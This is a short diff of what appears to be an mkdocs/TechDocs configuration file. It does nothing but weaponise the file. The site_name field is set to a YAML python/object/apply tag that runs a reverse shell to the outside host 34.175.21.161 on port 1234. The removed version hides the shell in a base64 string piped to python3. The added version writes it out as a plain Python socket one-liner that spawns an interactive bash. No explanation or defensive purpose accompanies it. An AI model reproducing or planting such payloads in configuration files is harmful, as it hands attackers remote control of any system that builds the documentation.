@@ -1,6 +1,6 @@
-site_name: !!python/object/apply:os.popen ["echo aW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjM0LjE3NS4yMS4xNjEiLDEyMzQpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0pCg== | base64 -d | python3"]
-plugins:
-  - techdocs-core
+site_name: !!python/object/apply:os.system 
+  - "python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"34.175.21.161\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])'"
+
 
 
 
